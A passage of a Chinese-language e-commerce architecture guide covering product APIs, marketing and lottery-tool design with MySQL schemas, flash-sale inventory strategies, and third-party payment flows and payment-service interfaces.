], &#125; ], "skus": [ // 有哪些sku "number, sku id", "number, sku id", ], "skus_map": &#123; "&#123;attr_value_id&#125;-&#123;attr_value_id&#125;-...": "number, sku id", "&#123;attr_value_id&#125;-&#123;attr_value_id&#125;-...": "number, sku id", "&#123;attr_value_id&#125;-&#123;attr_value_id&#125;-...": "number, sku id", "&#123;attr_value_id&#125;-&#123;attr_value_id&#125;-...": "number, sku id", "&#123;attr_value_id&#125;-&#123;attr_value_id&#125;-...": "number, sku id", "&#123;attr_value_id&#125;-&#123;attr_value_id&#125;-...": "number, sku id", &#125; &#125; &#125;&#125; 2、获取spu下所有skus库存 GET {version}/stock/spu/{spu_id} 请求参数： 字段 类型 是否必传 描述 spu_id number yes spu ID 响应内容： 123456789101112&#123; "code": "200", "msg": "OK", "result": &#123; "skus_stock": &#123; "int, sku id": &#123; "quantity": "int, 剩余库存数量" &#125; &#125; &#125; &#125;&#125; 3、sku详情 GET {version}/product/sku/{sku_id} 请求参数： 字段 类型 是否必传 描述 sku number yes sku ID 响应内容： 1234567891011121314151617181920&#123; "code": "200", "msg": "OK", "result": &#123; "id": "number, sku id", "name": "string, sku名称", "desc": "string, sku描述", "unit": "string, sku单位", "banner_url": [ "string, banner 图片url", "string, banner 图片url", ], "main_url": [ "string, 商品介绍主图 图片url", "string, 商品介绍主图 图片url", ], "price": "string, 售价", "market_price": "string, 市场价", &#125;&#125; 4、spu列表 GET {version}/product/spu/list 请求参数： 字段 类型 是否必传 描述 - - - - 响应内容： 1234567891011121314151617181920&#123; "code": "200", "msg": "OK", "result": &#123; "list": [ &#123; "id": "number, spu id", "name": "string, spu名称", "desc": "string, spu描述", "unit": "string, spu单位", "banner_url": [ "string, banner 图片url", "string, banner 图片url", ], "price": "string, 售价", "market_price": "string, 市场价", &#125; ] &#125;&#125; 营销体系营销体系在一个电商系统中承担着尖刀般的作用，为电商团队拼下无数订单，就如同现实生活中的一线销售人员，引流、促销、提高成单率和客单价。 一个营销体系拥有各种提升GMV的手段，并且仍然在不断的推陈出新，着实令人敬佩。 营销体系拆分按照不同的维度，我们把营销体系划分为两大系统： 系统 描述 维度 活动营销系统 拥有各种手段提升PV\UV，并引导消费 PV、UV维度 销售营销系统 拥有各种降低或变相降低价格的手段，来促进消费 价格维度 活动营销系统： 抽奖 按时间抽奖 按当前活动参与次数抽奖 按数额区间抽奖 活动模板 抢购？？？ 销售营销系统： 满减 满赠 买送 限时购(限时降价或限时折扣) 秒杀 加价购 多买 预售 全款预售 定金(订金)膨胀预售 盲售 拼团 砍价 众筹 组合套装 营销体系的基础服务支撑: 优惠券服务 满减券 折扣券 现金券 积分服务 概念定义营销体系中我们需要把以下概念定义清楚，要使用哪些名词，以及明确其定义，防止沟通过程中的效率低下或理解偏差： 概念 定义 抢购 爆品/新品发售场景 — — 满减 单笔订单满多少减多少，例如，“满500减20” 满赠 单笔订单满多少增送其他商品，例如，“满999送秋裤” 买送 买就送，例如，“全场下单送秋裤” 限时购 限定时间区间，降价或折扣 秒杀 白送价格，数量极少的销售场景，例如，“一元秒杀” 加价购 再加多少钱，可以低价购买其他推荐商品 多买 单笔订单购买多个sku，享受折扣 全款预售 预售库存一次付清 订金膨胀预售 包含订金阶段、尾款阶段，订金翻倍抵现尾款，订金可退 定金膨胀预售 包含定金阶段、尾款阶段，定金翻倍抵现尾款，定金不退 盲售 包含订金(定金)阶段，尾款阶段；不知道尾款价格，不知道sku的具体信息，只知道spu的信息（可选） 拼团 限定时间凑够多人成功支付订单(享优惠价格) 砍价(点赞降价) 限定时间邀请好友砍价到指定金额 众筹 限定时间购买人数达到指定人数及以上即可成功享受优惠价格 组合套装 多个sku捆绑销售 — — 满减券 单笔订单满多少才能使用的优惠券 折扣券 单笔订单折扣 现金券 单笔订单抵现金 通用抽奖工具(万能胶Glue)抽奖需求分析首先我们先来回顾下营销体系的组成： 营销体系 活动营销系统 销售营销系统 今天带来的是活动营销系统下的第一个独立子系统通用抽奖工具的介绍，本篇文章主要分为如下4部分： 常见抽奖场景与归类 抽奖需求配置 常见奖品类型 抽奖五要素 常见抽奖场景与归类下面是我列出来的一些常见的抽奖场景，红包雨、糖果雨、打地鼠、大转盘(九宫格)、考眼力、答题闯关、游戏闯关、支付刮刮乐、积分刮刮乐等等活动营销场景。 活动名称 描述 红包雨 每日整点抢红包🧧抽奖，每个整点一般可参与一次 糖果雨 每日整点抢糖果🍬抽奖，每个整点一般可参与一次 打地鼠 每日整点打地鼠抽奖，每个整点一般可参与一次 大转盘(九宫格) 某个时间段，转盘抽奖，每个场一般可参N次 考眼力 某个时间段，旋转杯子猜小球在哪个被子里，猜对可抽奖，一般每日可参与N次 答题闯关 每过一关，可参与抽奖，越到后面奖品越贵重 游戏闯关 每过一关，可参与抽奖，越到后面奖品越贵重 支付刮刮乐 支付订单后可刮奖，支付金额越大奖品越贵重 积分刮刮乐 积分刮奖，消费积分额度越大奖品越贵重 通过上面的活动描述，我们把整个抽奖场景归为以下三类： 类型 活动名称 维度 按时间抽奖 红包雨、糖果雨、打地鼠、幸运大转盘(九宫格)、考眼力 时间维度 按抽奖次数抽奖 答题闯关、游戏闯关 参与该活动次数维度 按数额范围区间抽奖 支付刮刮乐、积分刮刮乐 数额区间维度 接着我们来看下每类抽奖活动具体的抽奖需求配置。 抽奖需求配置本小节每类抽奖活动的需求配置，分为如下三个部分： 活动配置 场次配置 奖品配置 首先，第一类: 按时间抽奖的需求配置 类型 活动名称 特点 按时间抽奖 红包雨、糖果雨、打地鼠、幸运大转盘(九宫格)、考眼力 时间维度 按时间抽奖 是否多场次 单场次次数限制(次) 总场次次数限制(次) 红包雨 是 1 N 糖果雨 是 1 N 打地鼠 是 N N 幸运大转盘(九宫格) 否 N N 考眼力 否 N N 通过上面的分析我们得到了活动和场次的概念: 一个活动需要支持多场次的配置。 活动activity:配置活动的日期范围 场次session:配置每场的具体时间范围 红包雨的需求配置示例： 活动特征：红包雨需要支持多场次。 比如双十二期间三天、每天三场整点红包雨配置如下： 活动、场次配置： 双十二红包雨 活动配置： 2019-12-10 至 2019-12-12 场次配置： 10:00:00 至 10:01:00 12:00:00 至 12:01:00 18:00:00 至 18:01:00 奖品配置： 场次 奖品1 奖品2 — 奖品N 场次10:00:00 至 10:01:00 优惠券2元 空奖 — 无 场次12:00:00 至 12:01:00 优惠券5元 空奖 — 无 场次18:00:00 至 18:01:00 优惠券10元 优惠券20元 — 空奖 12345678910111213141516上面配置的结果如下：2019-12-10日三场整点红包雨：2019-12-10 10:00:00 ~ 10:01:002019-12-10 12:00:00 ~ 12:01:002019-12-10 18:00:00 ~ 18:01:002019-12-11日三场整点红包雨：2019-12-11 10:00:00 ~ 10:01:002019-12-11 12:00:00 ~ 12:01:002019-12-11 18:00:00 ~ 18:01:002019-12-12日三场整点红包雨：2019-12-12 10:00:00 ~ 10:01:002019-12-12 12:00:00 ~ 12:01:002019-12-12 18:00:00 ~ 18:01:00 幸运大转盘的需求配置示例： 活动特征：幸运大转盘不需要多场次。 比如年货节2020-01-20 至 2020-02-10期间幸运大转盘配置如下： 活动、场次配置： 双十二幸运大转盘 活动配置： 2019-12-10 至 2019-12-12 场次配置： 00:00:00 至 23:59:59 奖品配置： 场次 奖品1 奖品2 — 奖品N 场次00:00:00 至 23:59:59 优惠券2元 空奖 — 无 123上面配置的结果如下：幸运大转盘抽奖活动将于 2019-12-10 00:00:00 ~ 2019-12-12 23:59:59 进行 注意与思考：双十二幸运大转盘不需要多个场次，只配置一个场次即可，完全复用活动场次模型。 接着，第二类: 按抽奖次数抽奖的需求配置 类型 活动名称 特点 按抽奖次数抽奖 答题闯关、游戏闯关 (成功参与)当前活动次数维度 答题闯关的需求配置示例： 活动特征：每一关的奖品不同，一般越到后面中大奖的几率越大。 活动、场次配置： 双十二答题闯关 活动配置： 2019-12-10 至 2019-12-12 场次配置： 00:00:00 至 23:59:59 奖品配置： 双十二答题闯关 奖品 第一关 优惠券2元 第二关 优惠券5元 第三关 优惠券10元 第四关 优惠券20元 第五关 优惠券50元 第六关 优惠券100元 注意与思考：同理活动&amp;场次配置完全复用，同幸运大转盘配置(不需要支持多场次)。 最后，第三类: 按数额范围区间抽奖的需求配置： 类型 活动名称 特点 按数额范围区间抽奖 支付刮刮乐、积分刮刮乐 数额区间维度 支付刮刮乐的需求配置示例： 活动特征：不同的订单金额，一般金额越大中大奖的几率越大。 活动、场次配置: 双十二答题闯关 活动配置： 2019-12-10 至 2019-12-12 场次配置： 00:00:00 至 23:59:59 奖品配置： 订单金额 奖品1 奖品2 — 奖品N 0~100 优惠券2元 空奖 — 无 100~200 优惠券5元 空奖 — 无 200~1000 优惠券10元 优惠券20元 — 空奖 1000以上 优惠券50元 笔记本电脑 — 空奖 注意与思考：同理活动&amp;场次配置完全复用，同幸运大转盘配置(不需要支持多场次)。 总结: 通过上面的分析我们得到了抽奖工具的两个要素活动和场次。 常见奖品类型 抽奖抽什么？ 常见奖品类型 优惠券 积分 实物 空奖 总结: 我们得到了抽奖工具的另一个要素奖品。 抽奖五要素通过上面的分析我们已经得到了抽奖的三要素 活动 场次 奖品 那还有什么要素我们还没聊到呢？接下来来看。 第四要素：中奖概率 抽奖自然离不开奖品的中奖概率的设置。关于中奖概率我们支持如下灵活的配置： 手动设置奖品中奖概率 自动概率，根据当前奖品的数量、奖品的权重得到中奖概率 比如我们某次大促活动红包雨的配置如下： 活动配置 描述 活动时间 2019-12-10至2019-12-12 活动名称 2019双十二大促整点红包雨 活动描述 2019双十二大促全端整点红包雨活动 手动设置奖品概率 是 场次 奖品类型 具体奖品 奖品数量 中奖概率 10:00:00 ~ 10:01:00 优惠券 2元优惠券 2000 50% - 优惠券 5元优惠券 1000 20% - 空奖 - 5000 30% 12:00:00 ~ 12:01:00 优惠券 2元优惠券 2000 50% - 优惠券 5元优惠券 1000 20% - 空奖 - 5000 30% 18:00:00 ~ 18:01:00 优惠券 2元优惠券 2000 50% - 优惠券 5元优惠券 1000 20% - 空奖 - 5000 30% 备注：每轮场次中奖概率之和必须为100%，否则剩余部分默认添加为空奖的中奖概率。 第五要素：均匀投奖 如何均匀的抽走奖品? 答案: 均匀投奖。 具体方式为拆分总奖品数量，到各个细致具体的时间段。以双十二幸运大转盘为例： 场次 奖品类型 具体奖品 奖品数量 中奖概率 投奖时间(默认提前5分钟投奖) 投奖数量 00:00:00 至 23:59:59 优惠券 2元优惠券 2000 50% - - - - - - - 00:00:00 2000 - - - - - 06:00:00 2000 - - - - - 12:00:00 2000 - - - - - 18:00:00 2000 这里我们就得到了抽奖的第五个要素：均匀投奖。 需求总结通过上面的分析，我们得到抽奖五要素如下： 抽奖五要素 要素名称 第一要素 活动 第二要素 场次 第三要素 奖品 第四要素 中奖概率 第五要素 均匀投奖 同时我们通过抽奖五要素也得到了通用抽奖工具配置一场抽奖活动的5个基本步骤： 活动配置 场次配置 奖品配置 奖品中奖概率配置 奖品投奖配置 通用抽奖工具系统设计需求已经分析完了，今天我们就来看看这通用抽奖工具具体的设计，分为如下三个部分： DB设计 配置后台设计 接口设计 DB设计第一要素活动配置的抽奖活动表： 123456789101112131415161718-- 通用抽奖工具(万能胶Glue) glue_activity 抽奖活动表CREATE TABLE `glue_activity` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '活动ID', `serial_no` char(16) unsigned NOT NULL DEFAULT '' COMMENT '活动编号(md5值中间16位)', `name` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT '活动名称', `description` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT '活动描述', `activity_type` tinyint(1) unsigned NOT NULL DEFAULT '1' COMMENT '活动抽奖类型1: 按时间抽奖 2: 按抽奖次数抽奖 3:按数额范围区间抽奖', `probability_type` tinyint(1) unsigned NOT NULL DEFAULT '1' COMMENT '中奖概率类型1: static 2: dynamic', `times_limit` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '抽奖次数限制，0默认不限制', `start_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '活动开始时间', `end_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '活动结束时间', `create_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间', `create_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建人staff_id', `update_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间', `update_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改人staff_id', `status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '状态 -1:deleted, 0:disable, 1:enable', PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='抽奖活动表'; 第二要素场次配置的抽奖场次表： 1234567891011121314-- 通用抽奖工具(万能胶Glue) glue_session 抽奖场次表CREATE TABLE `glue_session` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '场次ID', `activity_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '活动ID', `times_limit` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '抽奖次数限制，0默认不限制', `start_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '场次开始时间', `end_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '场次结束时间', `create_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间', `create_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建人staff_id', `update_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间', `update_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改人staff_id', `status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '状态 -1:deleted, 0:disable, 1:enable', PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='抽奖场次表'; 第三、四要素奖品配置的抽奖场次奖品表： 1234567891011121314151617-- 通用抽奖工具(万能胶Glue) glue_session_prizes 抽奖场次奖品表CREATE TABLE `glue_session_prizes` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增ID', `session_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '场次ID', `node` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT '节点标识 按时间抽奖: 空值, 按抽奖次数抽奖: 第几次参与值, 按数额范围区间抽奖: 数额区间上限值', `prize_type` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '奖品类型 1:优惠券, 2:积分, 3:实物, 4:空奖 ...', `name` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT '奖品名称', `pic_url` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT '奖品图片', `value` varchar(255) unsigned NOT NULL DEFAULT '' COMMENT '奖品抽象值 优惠券:优惠券ID, 积分:积分值, 实物: sku ID', `probability` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '中奖概率1~100', `create_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间', `create_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建人staff_id', `update_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间', `update_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改人staff_id', `status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '状态 -1:deleted, 0:disable, 1:enable', PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='抽奖场次奖品表'; 第五要素均匀投奖的抽奖场次奖品定时投放器表： 12345678910111213-- 通用抽奖工具(万能胶Glue) glue_session_prizes_timer 抽奖场次奖品定时投放器表CREATE TABLE `glue_session_prizes_timer` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增ID', `session_prizes_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '抽奖场次奖品ID', `delivery_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '定时投放奖品数量的时间', `prize_quantity` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '奖品数量', `create_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间', `create_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建人staff_id', `update_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间', `update_by` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改人staff_id', `status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '状态 -1:deleted, 0:wait, 1:success', PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='抽奖场次奖品定时投放器表'; 其他表，抽奖记录&amp;奖品发放记录表： 12345678910111213-- 通用抽奖工具(万能胶Glue) glue_user_draw_record 用户抽奖记录表CREATE TABLE `glue_user_draw_record` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增ID', `activity_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '活动ID', `session_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '场次ID', `prize_type_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '奖品类型ID', `user_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建人user_id', `create_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间', `update_at` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间', `status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '状态 -1:未中奖, 1:已中奖 , 2: 发奖失败 , 3: 已发奖', `log` text COMMENT '操作信息等记录', PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='用户抽奖记录表'; 配置后台设计创建活动 创建活动场次 活动列表 接口设计 获取活动信息 GET {version}/glue/activity 请求参数： 字段 类型 是否必传 描述 serial_no string Y 活动编号 响应内容： 1234567891011121314151617181920212223242526&#123; "code": "200", "msg": "OK", "result": &#123; "serial_no": "string, 活动编号", "type": "number, 活动抽奖类型1: 按时间抽奖 2: 按抽奖次数抽奖 3:按数额范围区间抽奖", "name": "string, 活动名称", "description": "string, 活动描述", "start_time": "number, 活动开始时间", "end_time": "number, 活动开始时间", "remaining_times": "number, 活动抽奖次数限制，0不限制", "sessions_list":[ &#123; "start_time": "number, 场次开始时间", "end_time": "number, 场次开始时间", "remaining_times": "number, 场次抽奖次数限制，0不限制", "prizes_list": [ &#123; "name": "string, 奖品名称", "pic_url": "string, 奖品图片" &#125; ] &#125; ] &#125;&#125; 抽奖 POST {version}/glue/activity/draw 请求参数： 字段 类型 是否必传 描述 serial_no string Y 活动编号 uid number Y 用户ID 响应内容： 123456789101112131415161718192021222324// 中奖&#123; "code": "200", "msg": "OK", "result": &#123; "serial_no": "string, spu id", "act_remaining_times": "number, 本活动抽奖剩余次数，0不限制", "session_remaining_times": "number, 本场次抽奖剩余次数，0不限制", "prizes_info": &#123; "name": "string, 奖品名称", "pic_url": "string, 奖品图片" &#125; &#125;&#125;// 未中奖&#123; "code": "401", "msg": "", "result": &#123; &#125;&#125; 结语活动营销系统中的第一个字系统通用抽奖工具今天讲完了，希望对大家有一定的帮助或启示。 秒杀服务前言本文结构很简单： 5张图送你5种秒杀系统，再加点骚操作，再顺带些点心里话🤷‍♀️。 一个简单的秒杀系统实现原理： 通过redis原子操作减库存 图一 优点 缺点 简单好用 考验redis服务能力 是否公平 公平 先到先得 我们称这类秒杀系统为： 简单秒杀系统 如果刚开始QPS并不高，redis完全抗的下来的情况，完全可以依赖这个「简单秒杀系统」。 一个够用的秒杀系统实现原理： 服务内存限流算法 + redis原子操作减库存 图二 优点 缺点 简单好用 - 是否公平 不是很公平 相对的先到先得 我们称这类秒杀系统为： 够用秒杀系统 性能再好点的秒杀系统实现原理： 服务本地内存原子操作减库存 服务本地内存的库存怎么来的？ 活动开始前分配好每台机器的库存，推送到机器上。 图三 优点 缺点 高性能 不支持动态伸缩容(活动进行期间)，因为库存是活动开始前分配好的 释放redis压力 - 是否公平 不是很公平 不是绝对的先到先得 我们称这类秒杀系统为： 预备库存秒杀系统 支持动态伸缩容的秒杀系统实现原理： 服务本地协程Coroutine定时redis原子操作减部分库存到本地内存 + 服务本地内存原子操作减库存 图四 优点 缺点 高性能 支持动态伸缩容(活动进行期间) 释放redis压力 - 具备通用性 - 是否公平 不是很公平，但是好了点 几乎先到先得 我们称这类秒杀系统为： 实时预备库存秒杀系统 公平的秒杀系统实现原理： 服务本地Goroutine定时同步是否售罄到本地内存 + 队列 + 排队成功轮训(或主动Push)结果 图五 优点 缺点 高性能 开发成本高(需主动通知或轮训排队结果) 真公平 - 具备通用性 - 是否公平 很公平 绝对的先到先得 我们称这类秒杀系统为： 公平排队秒杀系统 骚操作 上面的秒杀系统还不够完美吗？ 答案：是的。 还有什么优化的空间？ 答案：静态化获取秒杀活动信息的接口。 静态化是什么意思? 答案：比如获取秒杀活动信息是通过接口 https://seckill.skrshop.tech/v1/acticity/get 获取的。现在呢，我们需要通过https://static-api.skrshop.tech/seckill/v1/acticity/get 这个接口获取。有什么区别呢？看下面： 服务名 接口 数据存储位置 秒杀服务 https://seckill.skrshop.tech/v1/acticity/get 秒杀服务内存或redis等 接口静态化服务 https://static-api.skrshop.tech/seckill/v1/acticity/get CDN、本地文件 以前是这样 变成了这样 结果：可以通过接口https://static-api.skrshop.tech/seckill/v1/acticity/get就获取到了秒杀活动信息，流量都分摊到了cdn，秒杀服务自身没了这部分的负载。 小声点说：“秒杀结果我也敢推CDN😏😏😏。” 12备注：之后我们会分享`如何用Golang设计一个好用的「接口静态化服务」`。 总结上面我们得到了如下几类秒杀系统 秒杀系统 简单秒杀系统 够用秒杀系统 预备库存秒杀系统 实时预备库存秒杀系统 公平排队秒杀系统 我想说的是里面没有最好的方案，也没有最坏的方案，只有适合你的。 拿先到先得来说，一定要看你们的产品对外宣传，切勿上来就追逐绝对的先到先得。其实你看所有的方案，相对而言都是“先到先得”，比如，活动开始一个小时了你再来抢，那相对于准时的用户自然抢不过，对吧。 又如预备库存秒杀系统，虽然不支持动态伸缩容。但是如果你的环境满足如下任意条件，就完全够用了。 秒杀场景结束时间之快，通常几秒就结束了，真实活动可能会发生如下情况： 服务压力大还没挂：根本就来不及动态伸缩容 服务压力大已经挂了：可以先暂停活动，服务起来&amp;扩容结束，用剩余库存重新推送 运维自身不具备动态伸缩容的能力 所以: 合适好用就行，切勿过度设计。 交易中心常见第三方支付流程这几年的工作中一直与支付打交到，借着 skr-shop 这个项目来与大家一起分享探索一下支付系统该怎么设计、怎么做。我们先从支付的一些常见流程出发分析，找出这些支付的共性，抽象后再去探讨具体的数据库设计、代码结构设计。 相关项目： PHP 版本的支付SDK Go 版本的支付SDK-开发中 支付整体而言的一个流程是：给第三方发起了一笔交易，用户通过第三方完成支付，第三方告诉我支付成功，我把用户购买的产品给用户。 看似简单的流程，这里边不同的支付机构却有不同的处理。下面以我接触过的一些支付来总结一下 国内支付国内的典型支付代表是：支付宝、微信、银行(以招商银行为例)，由于国内的支付都支持多种渠道的支付方式，为了描述简单，我们均以pc上的支付为例进行讲解。 支付宝支付宝的接入是我觉得最简单的一种支付。对于在PC上的支付能力，支付宝提供了【电脑支付】。当用户下单后，商户系统根据支付宝的规则构建好一个url，用户跳转到这个url后进入到支付宝的支付页面，然后完成支付流程。 在支付成功后，支付宝会通过 同步通知、异步通知 两种方式告诉商户系统支付成功，并且两种通知方式的结果都是可信的，而且异步通知的消息延迟也非常短暂。 对于退款流程，支付宝支持全额、部分退款。并且能够根据商户的退款单号区分是否是同一笔退款进而避免了重复退款的可能。支付的退款是调用后同步返回结果，不会异步通知。 微信支付微信并没有提供真的PC支付能力，但是我们可以利用【扫码支付】来达成电脑支付的目的。扫码支付有两种模式，这里以模式二为例。 微信调用下单接口获取到这个二维码链接，然后用户扫码后，进入支付流程。完成支付后微信会 异步通知，但是这里并没有 同步通知，因此前端页面只能通过定时轮训的方式检查这笔交易是否支付，直到查询到成功、或者用户主动关闭页面。 退款流程与支付宝最大的不同是，有一个 异步通知 需要商户系统进行处理。 第一个不同点： 异步通知的接口需要处理多种不同类型的异步消息 招商银行随着在线支付在国内的蓬勃发展，各家银行也是不断推出自己的在线支付能力。其中的佼佼者当属 招商银行。大家经常用的滴滴上面就有该支付方式，可以体验一下。 招商支付使用的是银行卡，因此首次用户必须进行绑卡。因此这里可能就多了一个流程，首先得记录用户是否绑过卡，然后用于签名的公钥会发生变化，需要定期更新。 招商所有平台的支付体验都是一致的，会跳转到招行的H5页面完成逻辑，支付成功后并不会自动跳回商户，也就是没有 同步通知，它的支付结果只会走异步通知流程，延迟非常短暂。 退款流程与支付宝一样，也是同步返回退款结果，没有异步通知。 第二个不同点： 支付前需要检查用户是否签约过，有签约流程 小结国内在线支付流程相对都比较完善，接入起来也非常容易。需要注意的一点是：退款后之前支付的单子依然是支付成功状态，并不会变成退款状态。因为退款与支付属于不同的交易。 这一点基本上是国内在线支付的通用做法。 国际支付国际支付的平台非常多，包括像支付宝、微信也在扩展这一块市场。我以我接触的几家支付做一个简单的总结。 WorldPay这是比较出名的一家国际支付公司，它主要做的是银行卡支付，公司在英国 支付流程上，也是根据规则构建好请求的url后，直接跳转到 WorldPay 的页面，通过信用卡完成支付。这里比较麻烦的处理机制是：支付成功后，他首次给你的异步/同步消息通知并不能作为支付成功的依据。真的从银行确认划款成功后，才会给出真的支付成功通知。这中间还可能会异步通知告诉你支付请求被拒绝。最头痛的是不同状态的异步消息时间间隔都是按照分钟以上级别的延迟来计算 退款流程上，状态跟微信一样，需要通过异步消息来确认退款状态。其次它的不同点在于无法根据商户退款单号来确认是否已经发起过退款，因此对于它来说只要请求一次退款接口，那它就默认发起了一次退款。 第三不同点： 支付成功后的通知状态有多种，涉及到商户系统业务流程的特殊处理 第四不同点： 退款不支持商户退款单号，无法支持防重复退款需要商户自己处理 Assist这是俄罗斯的一家支付公司，这也是一家搞死人不偿命的公司，看下面介绍 它的支付发起是需要构建一个form表单，向它post支付相关的数据。成功后会跳转到它的支付页，用户完成支付即可。对于 同步通知，它需要用户手动触发跳回商户，与招商的逻辑很像，同步也仅仅是做返回并不会真的告知支付结果。异步通知 才是真的告知支付状态。比较恶心的是，支付时必须传入指定格式的商品信息，这会在部分退款时用到。 现在来说退款，退款也是与 WorldPay 一样，不支持商户的退款单号，因此防重方面也许自己的系统进行设计。并且如果是部分退款，需要传入指定的退款商品，这就会出现一个非常尴尬的局面：部分退款的金额与任何一个商品金额都对应不上，退款则会失败。 第五个不同点： 部分退款时需要传入部分退款的商品信息，并且金额要一致 Doku接下来再来聊聊印尼的这家支付机构 doku。由于印尼这个国家信用卡的普及程度并不高，它的在线支付提供一种超商支付方式。 什么是超商支付呢？也就是用户在网络上完成下单后，会获取到一个二维码或者条形码。用户拿着这个条形码到超商（711、全家这种）通过收银员扫码，付现金给超商，完成支付流程。 这种方式带来的问题是，用户长时间不去支付，导致订单超时关单后才去付款。对整个业务流程以及用户体验带来很多伤害。 再来说退款，由于存在超商这种支付方式，导致这种支付无法支持在线自动退款，需要人工收集用户银行卡信息，然后完成转账操作。非常痛苦不堪。 第六个不同点： 线上没有付款，只有获取付款码，退款需要通过人工操作 AmazonPay亚马逊出品，与支付宝非常类似。提供的是集成式的钱包流程。 支付时直接构建一个url，然后跳转到亚马逊即可完成支付。它还提供一种授权模式，能够不用跳转amazon，再商户端即完成支付。 支付成功后也会同步跳转，同步通知 的内容可以作为支付是否成功的判断依据。经过实际检查 异步通知 的到达会稍有延迟，大概10s以内。 退款方面也支持商户退款单号可以依赖此进行防重。但是退款的状态也是基于异步来的。 总结这其中还有一些国际支付，如：PayPal、GooglePay、PayTM 等知名支付机构没有进行介绍，是因为基本它们的流程也都在上面的模式之中。我们后续的代码结构设计、数据库设计都基于满足上面的各种支付模型来完成设计。 最后，赠送大家一副脑图，这是接入一家支付时必须弄清楚的问题清单 支付系统设计文中我们从严谨的角度一步步聊到支付如何演变成独立的系统。内容包括：系统演进过程、接口设计、数据库设计以及代码如何组织的示例。若有不足之处，欢迎讨论共同学习。 从模块到服务我记得最开始工作的时候，所有的功能：加购物车/下单/支付 等逻辑都是放在一个项目里。如果一个新的项目需要某个功能，就把这个部分的功能包拷贝到新的项目。数据库也原封不动的拷贝过来，稍微根据需求改改。 这就是所谓的 单体应用 时代，随着公司产品线开始多元，每条产品线都需要用到支付服务。如果支付模块调整了代码，那么就会处处改动、处处测试。另一方面公司的交易数据割裂在不同的系统中，无法有效汇总统一分析、管理。 这时就到了系统演进的时候，我们把每个产品线的支付模块抽离成统一的服务。对自己公司内部提供统一的API使用，可以对这些API进一步包装成对应的SDK，供内部业务线快速接入。这里服务使用HTTP或者是RPC协议都可以根据公司实际情况决定。不过如果考虑到未来给第三方使用，建议使用HTTP协议， 系统的演变过程： 总结下，将支付单独抽离成服务后，带来好处如下： 避免重复开发，数据隔离的现象出现； 支付系统周边功能演进更容易，整个系统更完善丰满。如：对账系统、实时交易数据展示； 随时可对外开发，对外输出Paas能力，成为有收入的项目； 专门的团队进行维护，系统更有机会演进成顶级系统； 公司重要账号信息保存一处，风险更小。 系统能力如果我们接手该需求，需要为公司从零搭建支付系统。我们该从哪些方面入手？这样的系统到底需要具备什么样的能力呢？ 首先支付系统我们可以理解成是一个适配器。他需要把很多第三方的接口进行统一的整合封装后，对内部提供统一的接口，减少内部接入的成本。做为一个最基本的支付系统。需要对内提供如下接口出来： 发起支付，我们取名：/gopay 发起退款，我们取名：/refund 接口异步通知，我们取名：/notify/支付渠道/商户交易号 接口同步通知，我们取名：/return/支付渠道/商户交易号 交易查询，我们取名：/query/trade 退款查询，我们取名：/query/refund 账单获取，我们取名：/query/bill 结算明细，我们取名：/query/settle 一个基础的支付系统，上面8个接口是肯定需要提供的（这里忽略某些支付中的转账、绑卡等接口）。现在我们来基于这些接口看看都有哪些系统会用到。 